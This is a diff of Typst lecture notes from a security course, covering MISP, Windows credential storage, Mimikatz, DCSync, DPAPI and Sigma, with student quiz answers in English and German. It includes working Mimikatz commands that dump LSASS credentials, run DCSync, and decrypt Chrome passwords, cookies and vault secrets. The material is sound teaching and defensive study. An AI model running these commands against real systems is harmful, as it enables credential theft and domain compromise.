-software that distributes STIX via TAXII. Makes it easier to import data into your SIEM. *Types of data exchanged:*
-Threat intelligence, IoCs, targeted malware and attacks, financial fraud...
+correlating Indicators of Compromise. Developed by the Computer Incident Response Center in Luxemburg.
+By _hosting your own MISP instances_ you can receive and share this information from/with 6000 organizations worldwide.
+It is the software that distributes STIX via TAXII. Makes it easier to import data into your SIEM.
+
+*Types of data exchanged:* Threat intelligence, IoCs, targeted malware and attacks, financial fraud...
 
 MISP has various standards:
 - _Core Format:_ Exchanges indicators and threat information between MISP instances
@@ -2824,9 +2891,9 @@ MISP has various standards:
 
 == Events
 #align(center, image("img/misp-overview.png", width: 75%))
-Events in MISP capture contextually related information represented as attributes and object. Used to store and share
-malware data and IoCs in a structured way using STIX. Always belong to one organization, but can be shared to other MISP
-instances.
+Events in MISP capture contextually related information represented as attributes and object.
+Used to store and share malware data and IoCs in a structured way using STIX.
+Always belong to one organization, but can be shared to other MISP instances.
 
 An event contains:
 #v(-0.5em)
@@ -2849,45 +2916,45 @@ An event contains:
   table.header([Concept], [Description]),
   [*Attribute*],
   [
-    Describe a MISP event, like network indicators #hinweis[(IP address, domains)], system indicators #hinweis[(String
-      in memory)], bank account details...
+    Describe a MISP event, like network indicators #hinweis[(IP address, domains)],
+    system indicators #hinweis[(String in memory)], bank account details...
   ],
 
   [*Sightings*],
   [
-    A score on attributes that describe how many times this attribute was spotted in the wild. False positives can also
-    be reported here. Can have an optional expiry date for the attribute itself.
+    A score on attributes that describe how many times this attribute was spotted in the wild.
+    False positives can also be reported here. Can have an optional expiry date for the attribute itself.
   ],
 
   [*Object*],
   [
-    Group attributes together #hinweis[(Person object $->$ Last name, first name, portrait, address...)]. Should be
-    preferred over single attributes.
+    Group attributes together #hinweis[(Person object $->$ Last name, first name, portrait, address...)].
+    Should be preferred over single attributes.
   ],
 
   [*Category*],
   [
-    General groupings what the malware does and affects #hinweis[(Financial fraud, Network activity, payload
-      installation, person)]
+    General groupings what the malware does and affects
+    #hinweis[(Financial fraud, Network activity, payload installation, person)]
   ],
 
   [*Type*],
   [
-    Specific labels to describe what kind of data is affected by the malware #hinweis[(Bitcoin address, email body,
-      telephone number, cookie...)]
+    Specific labels to describe what kind of data is affected by the malware
+    #hinweis[(Bitcoin address, email body, telephone number, cookie...)]
   ],
 
   [*Attachment*],
   [
     File Attachments can be added to events. These are also categorized #hinweis[(Antivirus detection, Payload delivery,
-      Artifacts dropped, Network activity i.e. a PCAP file), External analysis, Support tool)]. Adding an attachment
-    will usually generate more attributes #hinweis[(Filename, filehash, size...)]
+      Artifacts dropped, Network activity (e.g. a PCAP file), External analysis, Support tool)].
+    Adding an attachment will usually generate more attributes #hinweis[(Filename, filehash, size...)]
   ],
 
   [*Free text*],
   [
     Allows arbitrary text on a event. If it is a known text format, it will be automatically detected and parsed.
-    Examples are a list of IP addresses, a Email in EML format, log files... For more complex imports, _templates_ are
+    Examples are a list of IP addresses, a email in EML format, log files... For more complex imports, _templates_ are
     available.
   ],
 
@@ -2911,36 +2978,30 @@ An event contains:
   ],
 )
 
-
-
-
 == Evaluation
 _Correlation Graphs_ show the event flow to visualize all events and show _correlations_ between events and attributes.
-Some correlations are automatically generated by MISP #hinweis[(Matching file hash, matching email address, matching
-  IP)]
+Some correlations are automatically generated by MISP #hinweis[(Matching file hash, matching email address, matching IPs)]
 
+_Clusters_ group events together. _Galaxies_ can be used to group a clusters of objects together.
+Can be attached to events or attributes. The elements inside a cluster are expressed as key-value pairs.
+*Example:* The MITRE ATT&CK galaxy contains a cluster for each attack type.
+Within that cluster are elements such as links to other references.
 
-_Clusters_ group events together. _Galaxies_ can be used to group a clusters of objects together. Can be attached to
-events or attributes. The elements inside a cluster are expressed as key-values. *Example:* The MITRE ATT&CK galaxy
-contains a cluster for each attack type. Within that cluster are elements like links to other references.
+_Warning Lists_ are lists of well known indicators that can be associated to _potential false positives_, errors or mistakes.
 
-
-_Warning Lists_ are lists of well known indicators that can be associated to _potential false positives_, errors or
-mistakes.
-
-_Notice Lists_ inform MISP users of _legal implications_, _privacy implications_, _policy implications_ and _technical
-implications_ of using specific attributes, categories or objects. *Example:* GDPR information.
+_Notice Lists_ inform MISP users of _legal implications_, _privacy implications_, _policy implications_ and
+_technical implications_ of using specific attributes, categories or objects. *Example:* GDPR information.
 
 == Sharing
-_Feeds_ easily import any remote or local URL to store the data in your MISP instance at regular intervals. Can be in
-the MISP format, CSV or free text. MISP itself supplies a list of open-source feeds. Caching the feed content to the
-Redis server allows correlating attributes and see matching Feed hints.
+_Feeds_ easily import any remote or local URL to store the data in your MISP instance at regular intervals.
+Can be in the MISP format, CSV or free text. MISP itself supplies a list of open-source feeds.
+Caching the feed content to the Redis server allows correlating attributes and see matching "Feed hits".
 
 Each user belongs to a MISP organization. The site admin manages the organizations. Only local organizations can access
-the instance. Data will be distributed later in Each MISP user can be granted _roles_. Usually, there is a separate sync
-user for synching with other MISP users.
+the instance. Data can be distributed later between organizations. Each MISP user can be granted _roles_ with different
+permissions. Usually, there is a separate sync user for synching with other MISP users.
 
-An event can have one of five distribution levels:
+An event can have one of five _distribution levels_:
 #v(-0.5em)
 #grid(
   [
@@ -2957,11 +3018,11 @@ An event can have one of five distribution levels:
 A _Sync Server_ is a MISP instance you want to sync with. Only the admin is able to add new ones. API credentials of the
 sync user are required to add it.
 
-Syncing can happen in two modes:
-- _Push:_ Syncs immediately after publication of the event. May not work due to connection issues or dead workers. Does
-  not sync data with "Your organization only" or "This community only".
-- _Pull:_ Only performed on command #hinweis[(manual trigger, cron job)]. Also fetches objects "Your organization only"
-  or "This community only"
+Syncing between MISP instances can happen in two modes:
+- _Push:_ Syncs immediately after publication of the event. May not work due to connection issues or dead workers
+  Does not sync data set to "Your organization only" or "This community only".
+- _Pull:_ Only performed on command #hinweis[(manual trigger, cron job)].
+  Also fetches objects set to "Your organization only" or "This community only"
 
 Additional syncing rules can be set, like allowed/blocked tags, allowed/blocked organizations...
 
@@ -2969,11 +3030,13 @@ _Sharing Groups_ are a more granular way to create re-usable distribution lists 
 organizations from your own instance or (in-)directly connected instances. A sharing group can be created by any user
 that has the sharing group editor permission.
 
+
 = Mimikatz
 Mimikatz is the defacto post-exploitation program to extract and manipulate Windows credentials. Running it requires
-local admin privileges. It retrieves credentials from LSASS memory or from Security Accounts Manager (SAM) files. If it
-finds NTLM hashes or Kerberos tickets, they can be used for _pass-the-hash or pass-the-ticket attacks_ or to create a
-_golden ticket_.
+local admin privileges. It retrieves credentials from LSASS memory #hinweis[(see chapter @lsass)] or from Security
+Accounts Manager (SAM) files. If it finds NTLM hashes or Kerberos tickets, they can be used for _pass-the-hash or
+pass-the-ticket attacks_ or to create a _golden ticket_.
+
 #v(-0.5em)
 #table(
   columns: (auto, 1fr),
@@ -2981,45 +3044,60 @@ _golden ticket_.
   [*`::`*], [List all parent modules],
   [*`<module>::`*], [List submodules for a given parent],
   [*`token::elevate`*\ or\ *`priviledge::debug`*],
-  [Many Mimikatz modules require `SeDebugPrivilege` to use. Both these commands can acquire them, if Mimikatz is running
-    under an Administrator account and runs elevated],
+  [
+    Many Mimikatz modules require `SeDebugPrivilege` to use. Both of these commands can acquire them, if Mimikatz is
+    running under an Administrator account and runs elevated.
+  ],
 
   [*`lsadump::`*],
-  [Interact with the local security authority (LSA) to extract local credentials with `lsadump::sam`. Requires Debug
-    privileges.],
+  [
+    Interact with the local security authority (LSA) to extract local credentials with `lsadump::sam`.
+    Requires `SeDebugPrivilege`.
+  ],
 
-  [*`sekurlsa::logonpasswords`*], [Interact with LSASS to dump credentials. Requires Debug Priviledges],
+  [*`sekurlsa::logonpasswords`*], [Interact with LSASS to dump credentials. Requires `SeDebugPrivilege`.],
   [*`sekurlsa::minidump <dmp>`*],
-  [Interacting with LSASS memory will alert any anti-virus program. Therefore obtain LSASS memory through a memory dump
-    from Task Manager or `procdump` and load it into Mimikatz.],
+  [
+    Interacting with LSASS memory will alert any anti-virus program. This command lets you obtain LSASS data
+    through a memory dump of LSASS from Task Manager or `procdump` and load it into Mimikatz.
+  ],
 )
 
 == Windows Credential Management
+Windows Credentials are managed through multiple steps.
 #definition[`Thread/Process -> Token -> Logon Session -> Auth Package -> Credential`]
 
 #grid(
+  [
+    _Tokens_ are the current security context of a process/thread. If a thread wants to _act in the name of a user_,
+    it uses a token. Tokens are _tied to a logon session_ and determine how the credential is used.
+  ],
   image("img/windows-cred-token.png"),
+  [
+    Windows creates a _logon session_ upon successful authentication. User credentials are stored in `lsass.exe`
+    The credentials are tied to _authentication packages_ inside the logon session #hinweis[(e.g. NTLM hashes,
+      Kerberos tickets/keys, passwords in plaintext)].
+
+    The OS can use the user credentials in LSASS to perform Single-Sign-On.
+  ],
   image("img/windows-cred-session.png"),
 )
 
 
-_Tokens_ are the current security context of a process/thread. If a thread wants to act in the name of a user, it uses a
-token. Tokens are tied to a logon session and determine how the credential is used.
 
-Windows creates a _logon session_ upon successful authentication. User credentials are stored in `lsass.exe`
-#hinweis[(OS might use them later to SSO into other services)]. The credentials are tied to _authentication packages_
-inside the logon session #hinweis[(NTLM hashes, Kerberos tickets/keys, passwords in plaintext)].\
+
+
 
 There are different session types:
-- _Network Logon (Type 3):_ Clients prove that they have the credentials, but don't send them #hinweis[(NTLM
-    challenge/response aka. pass-the-hash)]. If a user logged in this way, there are no credentials to steal.
+- _Network Logon (Type 3):_ Clients prove that they have the credentials, but don't send them
+  #hinweis[(NTLM challenge/response aka. pass-the-hash)]. If a user logged in this way, there are no credentials to steal.
 - _Non-Network logons #hinweis[(Interactive/NetworkCleartext)]:_ The credentials are sent to the server and therefore
   stored in LSASS #hinweis[(RDP interactive logon)]
 
 === The Double-Hop Problem
-Tokens tied to the Network Logon Sessions can't be used for lateral movement because they don't cache credentials. When
-you remotely execute code with WMI or WinRM, you'll recieve a token that is tied to a Network Logon session. It is
-impossible to _"double-hop"_ and authenticate to other resources in the network from this compromised host.
+Tokens tied to the Network Logon Sessions can't be used for lateral movement because they don't cache credentials.
+When you remotely execute code with WMI or WinRM, you'll receive a token that is tied to a Network Logon session.
+It is impossible to _"double-hop"_ and authenticate to other resources in the network from this compromised host.
 
 *Workarounds*
 - _Use another token pointing to a non-network logon session_ by stealing another token or injecting into another
@@ -3027,8 +3105,9 @@ impossible to _"double-hop"_ and authenticate to other resources in the network 
 - _Create a new token pointing to a non-network logon session_ by using stolen credentials
 - _Load credentials into current session_ with pass-the-ticket
 
-=== Token types & impersonation
+#pagebreak()
 
+=== Token types & impersonation
 #table(
   columns: (auto, 1fr),
   table.header([Token], [Description]),
@@ -3039,8 +3118,8 @@ impossible to _"double-hop"_ and authenticate to other resources in the network 
 
   [*Impersonation\ Tokens*],
   [
-    A thread token. Used to impersonate other tokens in the client/server scenarios, depending on the impersonation
-    level the OS might use the token's credentials to authenticate remotely.
+    A thread token. Used to impersonate other tokens in the client/server scenarios, depending on the _impersonation
+    level_ the OS might use the token's credentials to authenticate remotely.
   ],
 )
 #v(-0.5em)
@@ -3051,8 +3130,8 @@ impossible to _"double-hop"_ and authenticate to other resources in the network 
 - _Delegation:_ Remote server can impersonate client across multiple boundaries and make calls on behalf
   #hinweis[("double-hop")]
 
-Stolen impersonation tokens with anonymous/identification level can't be used for remote authentication. Tokens with
-Impersonation/Delegation level might work, if the logon session has credentials in it.
+Stolen impersonation tokens with "Anonymous" or "Identification" level can't be used for remote authentication.
+Tokens with "Impersonation" or "Delegation" level might work, if the logon session has credentials in it.
 
 === Using Mimikatz to obtain credentials
 Mimikatz can interact with process and thread tokens. The `token::` module enables interaction with authentication
@@ -3069,22 +3148,22 @@ For each logon session, Mimikatz enumerates the credentials in each authenticati
 == DCSync
 DCSync is a late-stage attack to obtain arbitrary user- and machine-credentials #hinweis[(Kerberos keys, NTLM hashes)].
 Relies on data replication features between _multiple domain controllers_ using _Microsoft Directory Replication Server
-Remote Protocol (MS-DRSR)_. The attack consists of _simulating a domain controller_ asking another domain controller to
-replicate one or more objects with credentials. Requires specific privileges, by default only active on the "Domain
-Admin" and "Domain Controller" group.
+Remote Protocol (MS-DRSR)_. The attack consists of _simulating a domain controller_, which then asks another domain
+controller to replicate one or more objects with credentials. Requires specific privileges to execute: By default,
+only user in the "Domain Admin" and "Domain Controller" groups are able to perform syncs.
 
-Mimikatz can perform a DCSync attack with a user that has the "Replicate changes" permission on the DC.
+Mimikatz can perform a DCSync attack with a user that has the "Replicate Directory changes" permission on the DC.
 ```sh
 lsadump::dcsync /domain:mydomain.local /user:someuser
 ```
 
 == Data Protection API <dpapi>
-The _Data Protection API (DPAPI)_ provides a set of API calls #hinweis[(`CryptProtectData`/`CryptUnprotectData`)] that
-allow applications to encrypt/decrypt data blobs at rest on the system. It provides applications an easy ways to
+The _Data Protection API (DPAPI)_ on Windows provides a set of API calls #hinweis[(`CryptProtectData`/`CryptUnprotectData`)]
+that allow applications to encrypt/decrypt data blobs at rest on the system. It provides applications an easy ways to
 securely store secrets on disk without having to worry about key management overhead.
 
-+ Pass the API a byte array and optional entropy, get encrypted data back
-+ The keys are linked to the system or the user and handled automatically by the OS
+Programs can pass the API a byte array and optional entropy and get encrypted data back.
+The keys of each entry are linked to the system or the user and handled automatically by the OS.
 
 *Secrets protected by DPAPI*
 #v(-0.5em)
@@ -3108,30 +3187,28 @@ securely store secrets on disk without having to worry about key management over
 === User & Machine Master Keys
 #grid(
   [
-    A user's password is used to derive a _pre-key_, which is then used to decrypt one or more "master key" blobs. This
-    is done so the user can change their password without having to re-encrypt all the data stored in DPAPI.
-
+    A user's password is used to derive a _pre-key_, which is then used to decrypt one or more "master key" blobs.
+    This is done so the _user can change their password_ without having to re-encrypt all the data stored in DPAPI.
 
     The master keys are stored at `%APPDATA%\Microsoft\Protect\<user-SID>\<key-GUID>`. Windows renews the current master
-    key every 3 months. But the previous master key must be kept to allow decryption of older blobs. There is also a
-    domain backup DPAPI key.
-
+    key every 3 months. But the previous master keys must be kept to allow decryption of older blobs.
+    There is also a domain backup DPAPI key.
   ],
   image("img/dpapi-user-key.png"),
 )
 
-#pagebreak()
+
 The _`SYSTEM` user_ has master keys at
 - `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\<GUID>`
 - `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User\<GUID>`
+
 They are encrypted with a password derived from the `DPAPI_SYSTM` LSA secret. The first half of the `DPAPI_SYSTEM` key
 is for the _first level of master keys_, the second half is for the_ `\User` master keys_. You have to be `SYSTEM` to
-retrieve this and it can't be done remotely.
+retrieve these and it can't be done remotely.
 
 LSA Secrets dumper like Mimikatz can extract the `DPAPI_SYSTEM` key with `token::elevate` and _`lsadump::secrets`_
 
 === Decrypting User Secrets
-
 #image("img/dpapi-decrypt.png")
 
 The DPAPI user master keys for logged on users are in LSASS memory. Within a user's context, it is often possible to
@@ -3145,7 +3222,6 @@ dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /u
 dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" /masterkey:<key>
 ```
 
-
 === Getting the user master key
 ==== From LSASS memory
 If you can execute code in the target user's context, extracting the key is easy, as seen above. But if you can't, other
@@ -3156,11 +3232,11 @@ operations.
 #grid(
   columns: (2fr, 1fr),
   [
-    Mimikatz can do this as well. It extracts the loaded master key GUIDs from LSASS into SHA-1 decrypted keys. We can
-    also decrypt `CRYPTPROTECT_SYSTEM` blobs, as we're getting the keys straight from LSASS memory.
+    Mimikatz can do this as well. It extracts the loaded master key GUIDs from LSASS into SHA-1 decrypted keys.
+    We can also decrypt `CRYPTPROTECT_SYSTEM` blobs, as we're getting the keys straight from LSASS memory.
   ],
   [
-    ```
+    ```sh
     privilege::debug
     sekurlsa::dpapi
     dpapi::cache
@@ -3174,7 +3250,7 @@ logged in users. You can now spot the required master key from the UUID.
 
 
 ==== Offline decryption from plaintext password
-If a user's plaintext password is known, we can decrpyt a user's master key blob; even on a offline machine.
+If a user's plaintext password is known, we can decrypt a user's master key blob; even on a offline machine.
 ```bat
 dpapi::masterkey /in:<masterkey-location> /sid:<user-SID> /password:<plaintext> /protected
 ```
@@ -3215,7 +3291,7 @@ and have a `Policy.vpol` that is decrypted with a master key. Two AES keys withi
 one or more `.vcrd` files.
 
 *User:*
-`%userprofile%\AppData\(Local|Roaming)\Microsoft\...`\
+`%userprofile%\AppData\[Local|Roaming]\Microsoft\...`\
 *Local system:*\
 `C:\Windows\System32\config\systemprofile\AppData\[Roaming|Local]\Microsoft\...`\
 `C:\Windows\ServiceProfiles\[LocalService|NetworkService]\AppData\[Roaming|Local]\Microsoft\...`
@@ -3226,7 +3302,7 @@ dpapi::vault /masterkey:SHA1 /cred:<path>\ID.vcrd /policy:<path>\Policy.vpol
 ```
 
 ==== Saved RDP connection credentials (RDG)
-```
+```bat
 dpapi::blob /in:<rdg-file> [/masterkey:SHA1|/unprotect]
 ```
 
@@ -3245,7 +3321,7 @@ Windows 10 introduced _Credential Guard_, which isolates secrets in virtualized 
 everything in LSASS.
 
 *Best Practices*\
-Credentials need to be stored on windows machines, in order to allow Single-Sign-On. This inherently brings the risk of
+Credentials need to be stored on Windows machines, in order to allow Single-Sign-On. This inherently brings the risk of
 cached credentials being stolen. However, you can mitigate the risk by
 - No password re-use, use strong passwords and protect hashes
 - Implement Logon Restrictions for your privileged accounts to limit exposure
@@ -3254,7 +3330,6 @@ cached credentials being stolen. However, you can mitigate the risk by
 - Deploy Credential Guard
 
 == SIGMA
-
 #grid(
   [
     Sigma is a generic and open _signature format_ that allows you to _describe relevant log events_. The rule format is
@@ -3263,8 +3338,8 @@ cached credentials being stolen. However, you can mitigate the risk by
     methods and make them shareable with others. Sigma is for log files what Snort is for network traffic and YARA is
     for binary files.
 
-    Sigma Rules can be mapped to Sysmon Event IDs and fields. This way, sysmon can be used to generate Sigma Rules for
-    other SIEM solutions. For example, Mimikatz can be detected with this process.
+    Sigma Rules can be mapped to Sysmon Event IDs and fields #hinweis[(see chapter @sysmon)]. This way, sysmon can be used
+    to generate Sigma Rules for other SIEM solutions. For example, Mimikatz can be detected with this process.
 
   ],
   [
@@ -3291,10 +3366,10 @@ cached credentials being stolen. However, you can mitigate the risk by
   ],
 )
 
+#pagebreak()
+
 = Quizfragen von Studenten
-
 ==== Explain Man-in-the-Browser (MitB) and Man-in-the-Middle (MitM) attacks and describe each with one scenario
-
 *Man-in-the-Middle (MitM):*
 Man attacker intercepts network traffic and listens between the client and server in the communication path (e.g. ARP
 spoofing or DNS hijacking). The attacker can read, alter or inject data into the requests.\
@@ -3311,7 +3386,6 @@ account and amount to 10000 CHF while displaying the original 1000 CHF on screen
 authenticated session.
 
 ==== What is DNS Cache Poisoning and does it work?
-
 DNS cache poisoning (also called DNS spoofing) is an attack where an attacker injects wrong DNS records into a DNS
 server's cache. This causing users to be redirected to malicious IP addresses when they request legitimate domain names.
 
@@ -3344,16 +3418,12 @@ repeatedly sending passwords over the network. In Active Directory, it involves 
 
 
 ==== An organization suspects that a workstation inside the internal network is compromised by malware. The malware cannot accept inbound connections due to firewall restrictions.
+*a)* Explain two different techniques a malware can use to communicate from the internal network to the outside world
+in such an environment.
 
-*a)*
-Explain two different techniques a malware can use to communicate from the internal network to the outside world in such
-an environment.
+*b)* One of these techniques is DNS tunneling. Explain how DNS tunneling works at a high level.
 
-*b)*
-One of these techniques is DNS tunneling. Explain how DNS tunneling works at a high level.
-
-*c)*
-From a defender’s perspective, name three indicators that could help detect DNS tunneling in network traffic or logs.
+*c)* From a defender’s perspective, name three indicators that could help detect DNS tunneling in network traffic or logs.
 
 *Solution*
 
@@ -3369,53 +3439,44 @@ From a defender’s perspective, name three indicators that could help detect DN
 queries containing small chunks of data to an attacker-controlled domain. The attacker’s DNS server reconstructs the
 data from these queries and can also send commands back via DNS responses.
 
-*c)*
-Possible indicators of DNS tunneling include:
+*c)* Possible indicators of DNS tunneling include:
 - Unusually long or random-looking domain names
 - High volume of DNS requests to a single domain
 - DNS queries with uncommon character distributions (e.g. Base64 patterns)
 
 ==== Email Security
-
 Ein Unternehmen stellt fest, dass Kunden vermehrt Phishing-E-Mails erhalten, die scheinbar von der eigenen Domain
 stammen. Die Domain ist öffentlich erreichbar und wird für regulären E-Mail-Versand genutzt.
 
-*a)*
-Erkläre das Funktionsprinzip von SPF. Welche Information wird im DNS hinterlegt, und was prüft der empfangende
+*a)* Erkläre das Funktionsprinzip von SPF. Welche Information wird im DNS hinterlegt, und was prüft der empfangende
 Mailserver konkret?
 
-*b)*
-Beschreibe, wie DKIM die Integrität und Authentizität einer E-Mail sicherstellt. Gehe dabei auf die Rolle von Hash,
+*b)* Beschreibe, wie DKIM die Integrität und Authentizität einer E-Mail sicherstellt. Gehe dabei auf die Rolle von Hash,
 Signatur und DNS-Eintrag ein.
 
-*c)*
-Erkläre, wie DMARC SPF und DKIM kombiniert. Was bedeutet `Alignment` in diesem Kontext, und welche drei Policy-Optionen
+*c)* Erkläre, wie DMARC SPF und DKIM kombiniert. Was bedeutet `Alignment` in diesem Kontext, und welche drei Policy-Optionen
 kann eine DMARC-Konfiguration enthalten?
 
-*d)*
-Eine E-Mail besteht die SPF-Prüfung, fällt jedoch bei DKIM durch. Die Domain hat DMARC mit der Policy `p=reject`
+*d)* Eine E-Mail besteht die SPF-Prüfung, fällt jedoch bei DKIM durch. Die Domain hat DMARC mit der Policy `p=reject`
 konfiguriert. Erkläre, wie der empfangende Mailserver mit dieser E-Mail umgeht und warum.
 
 
 *Solution*
 
-*a)*
-SPF (Sender Policy Framework) dient dazu, festzulegen, welche Mailserver berechtigt sind, E-Mails im Namen einer
+*a)* SPF (Sender Policy Framework) dient dazu, festzulegen, welche Mailserver berechtigt sind, E-Mails im Namen einer
 bestimmten Domain zu versenden. Die Information wird als SPF-Record im DNS der Domain hinterlegt und enthält eine Liste
 erlaubter IP-Adressen oder Hostnamen. Der empfangende Mailserver prüft beim Eingang einer E-Mail, ob die IP- Adresse des
 sendenden Mailservers im SPF-DNS-Eintrag der im Envelope- From angegebenen Domain enthalten ist. Ist dies der Fall, gilt
 die SPF-Prüfung als bestanden, andernfalls als fehlgeschlagen oder neutral.
 
-*b)*
-DKIM (DomainKeys Identified Mail) stellt die Integrität und Authentizität einer E-Mail sicher. Beim Versand der E-Mail
+*b)* DKIM (DomainKeys Identified Mail) stellt die Integrität und Authentizität einer E-Mail sicher. Beim Versand der E-Mail
 erstellt der sendende Mailserver einen Hash über ausgewählte Header-Felder und den Body der Nachricht. Dieser Hash wird
 mit einem privaten Schlüssel digital signiert und als DKIM-Signatur im E-Mail-Header abgelegt. Der empfangende
 Mailserver ruft den zugehörigen öffentlichen Schlüssel aus dem DNS der sendenden Domain ab und prüft damit die Signatur.
 Ist die Signatur gültig, wurde die E-Mail seit dem Versand nicht verändert und stammt kryptographisch nachweisbar von
 der angegebenen Domain.
 
-*c)*
-DMARC (Domain-based Message Authentication, Reporting and Conformance) kombiniert die Ergebnisse von SPF und DKIM und
+*c)* DMARC (Domain-based Message Authentication, Reporting and Conformance) kombiniert die Ergebnisse von SPF und DKIM und
 definiert eine klare Richtlinie für den Umgang mit fehlgeschlagenen Prüfungen.
 
 Alignment bedeutet, dass die Domain im sichtbaren From-Header mit der Domain übereinstimmen muss, die für SPF und oder
@@ -3427,8 +3488,7 @@ Eine DMARC-Konfiguration kann drei Policy-Optionen enthalten:
 - `p=quarantine`, verdächtige E-Mails werden z.B. in den Spam-Ordner verschoben
 - `p=reject`, E-Mails werden abgelehnt
 
-*d)*
-Obwohl die E-Mail die SPF-Prüfung besteht, fällt sie bei DKIM durch. Da DMARC aktiv ist und die Policy auf `p=reject`
+*d)* Obwohl die E-Mail die SPF-Prüfung besteht, fällt sie bei DKIM durch. Da DMARC aktiv ist und die Policy auf `p=reject`
 gesetzt wurde, prüft der empfangende Mailserver, ob mindestens eine der beiden Methoden SPF oder DKIM erfolgreich ist
 und korrekt aligned ist.
 
@@ -3437,18 +3497,16 @@ die DMARC-Prüfung insgesamt fehl. Der empfangende Mailserver lehnt die E-Mail d
 verhindern.
 
 ==== Bind Shell, Reverse Shell und Web Shell
-
 Im Rahmen einer Incident-Response-Untersuchung analysierst du ein kompromittiertes Linux-System. Es besteht der
 Verdacht, dass der Angreifer interaktive Shells zur Persistenz oder Fernsteuerung eingesetzt hat.
 
-*a)*
-Erkläre die Unterschiede zwischen Bind Shell, Reverse Shell und Web Shell. Gehe dabei jeweils auf folgende Aspekte ein:
+*a)* Erkläre die Unterschiede zwischen Bind Shell, Reverse Shell und Web Shell. Gehe dabei jeweils auf folgende Aspekte ein:
 
 - Richtung der Netzwerkverbindung
 - Typischer Einsatzort (Server, Webanwendung, internes Netz)
 - Ein Vorteil und ein Nachteil aus Sicht des Angreifers
-*b)*
-Ein Angreifer nutzt eine Reverse Shell von einem kompromittierten Server zu einem externen Host.
+
+*b)* Ein Angreifer nutzt eine Reverse Shell von einem kompromittierten Server zu einem externen Host.
 
 1. Begründe, warum Reverse Shells in realen Angriffsszenarien häufiger eingesetzt werden als Bind Shells, insbesondere
   in Umgebungen mit Firewalls und NAT.
@@ -3460,8 +3518,7 @@ Ein Angreifer nutzt eine Reverse Shell von einem kompromittierten Server zu eine
 
 *Solution*
 
-*a)*
-Bind Shell:
+*a)* Bind Shell:
 - Richtung der Verbindung: Der kompromittierte Host öffnet einen Port und wartet auf eine eingehende Verbindung des
   Angreifers
 - Typischer Einsatzort: Systeme ohne restriktive Firewall-Regeln und nicht hinter NAT
@@ -3528,8 +3585,7 @@ IOCs sind Attribute, die direkt zur Erkennung von Angriffen genutzt werden könn
 Zusammenhang: Ein Event enthält mehrere Attribute, von denen ein Teil als IOCs verwendet wird, um Systeme oder Logs auf
 Hinweise eines Angriffs zu prüfen.
 
-*c)*
-Ein Vorteil von MISP ist der organisationsübergreifende Austausch von aktuellen Bedrohungsinformationen, wodurch
+*c)* Ein Vorteil von MISP ist der organisationsübergreifende Austausch von aktuellen Bedrohungsinformationen, wodurch
 Angriffe früher erkannt werden können.
 
 Ein weiterer Vorteil ist die Strukturierung und Kontextualisierung von IOCs, wodurch Detektionsregeln gezielter erstellt
@@ -3543,7 +3599,7 @@ YARA leiten.
 *a)* Strategievergleich: Erkläre, warum der Einsatz von YARA-Regeln gegenüber einem klassischen Virenscanner (AV) bei
 der Untersuchung eines Vorfalls vorteilhaft sein kann, und nenne einen wesentlichen Nachteil.
 
-*b)*Effizienz der Suche: Dein Kollege möchte alle 5.000 Rechner in deinem Unternehmen allein nach dem SHA256-Hash der
+*b)* Effizienz der Suche: Dein Kollege möchte alle 5.000 Rechner in deinem Unternehmen allein nach dem SHA256-Hash der
 Datei durchsuchen. Erkläre, warum das ohne weitere Metadaten eine schlechte Idee ist, und schlage eine konkrete
 Effizienzsteigerung vor.
 
@@ -3673,7 +3729,7 @@ can also simply redirect a token or the fingerprint information. This means 2FA 
 man in the middle attack. Unless one factor is engineered in a way that makes it non-redirectable. (Like FIDO2)
 
 
-==== In Memory Forensics, where can Evidence be found and what artifacts are of interest?(List 3 Evidence "places" and 4 Artifacts of interest)
+==== In Memory Forensics, where can Evidence be found and what artifacts are of interest? (List 3 Evidence "places" and 4 Artifacts of interest)
 
 Evidence "places" and 4 Artifacts of interest) Evidence:
 - Physical Memory
@@ -3688,5 +3744,3 @@ Artifacts of interest:
 - Console command history
 - Strings in memory
 - Credentials and keys
-
-
